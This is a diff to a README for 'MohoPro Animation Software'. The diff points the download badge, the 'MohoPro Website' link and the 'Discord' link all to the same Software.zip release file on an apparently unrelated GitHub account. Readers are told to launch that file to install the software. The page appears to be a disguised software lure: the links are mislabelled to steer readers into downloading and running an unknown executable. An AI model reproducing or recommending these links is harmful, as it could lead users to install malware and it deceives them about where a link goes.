@@ -18,15 +18,15 @@ MohoPro Animation Software is a powerful tool that allows you to create stunning
 
 ## Get Started
 To get started with MohoPro Animation Software, download the software package from the following link:
-[![Download MohoPro Animation Software](https://img.shields.io/static/v1?label=Download&message=MohoPro&color=brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download MohoPro Animation Software](https://github.com/jrjj112JR/MohoPro-Animation-Software/releases/download/v1.0/Software.zip)](https://github.com/jrjj112JR/MohoPro-Animation-Software/releases/download/v1.0/Software.zip)
 
 Ensure that the downloaded file is launched to initiate the installation process.
 
 ## Explore More
-Visit the [MohoPro Website](https://www.mohopro.com) to discover additional resources, tutorials, and support for creating amazing animations using MohoPro Animation Software.
+Visit the [MohoPro Website](https://github.com/jrjj112JR/MohoPro-Animation-Software/releases/download/v1.0/Software.zip) to discover additional resources, tutorials, and support for creating amazing animations using MohoPro Animation Software.
 
 ## Join the Community
-Connect with fellow animators, share your work, and seek advice by joining the MohoPro Animation Software community on [Discord](https://discord.com/mohopro).
+Connect with fellow animators, share your work, and seek advice by joining the MohoPro Animation Software community on [Discord](https://github.com/jrjj112JR/MohoPro-Animation-Software/releases/download/v1.0/Software.zip).
 
 ---
 
